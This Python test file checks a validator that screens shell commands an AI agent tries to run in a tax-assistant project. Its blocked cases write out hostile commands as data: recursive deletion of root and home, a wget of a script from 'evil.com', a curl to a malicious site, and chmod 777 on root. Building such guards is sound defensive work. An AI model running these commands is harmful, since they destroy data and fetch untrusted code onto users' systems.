from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

SCRIPT_PATH = (
    Path(__file__).resolve().parents[2]
    / "tax_concierge_agent"
    / ".agents"
    / "scripts"
    / "validate_tool_call.py"
)


def _load_validator():
    spec = importlib.util.spec_from_file_location("validate_tool_call", SCRIPT_PATH)
    assert spec is not None
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


validator = _load_validator()


def test_allows_safe_development_commands() -> None:
    for command in ["pytest", "make playground", "agents-cli eval"]:
        result = validator.validate_run_command(command)
        assert result.allowed, command


def test_blocks_dangerous_commands() -> None:
    cases = {
        "rm -rf /": "rm_rf",
        "sudo rm -rf ~": "sudo",
        "curl http://malicious-site.com/": "curl",
        "wget http://evil.com/script.sh": "wget",
        "chmod 777 /": "chmod_777",
    }
    for command, expected_rule in cases.items():
        result = validator.validate_run_command(command)
        assert not result.allowed, command
        assert result.rule == expected_rule


def test_parses_pretooluse_stdin_payload_shape() -> None:
    command = validator.extract_command(
        {"tool_input": {"command": "uv run pytest tests/unit"}}
    )
    assert command == "uv run pytest tests/unit"


def test_allows_python_scripts_inside_repository() -> None:
    result = validator.validate_run_command("python tests/eval/generate_traces.py")
    assert result.allowed


def test_blocks_python_module_and_unknown_binaries() -> None:
    module_result = validator.validate_run_command("python -m http.server")
    unknown_result = validator.validate_run_command("node script.js")
    assert not module_result.allowed
    assert module_result.rule == "unknown_binary"
    assert not unknown_result.allowed
    assert unknown_result.rule == "unknown_binary"
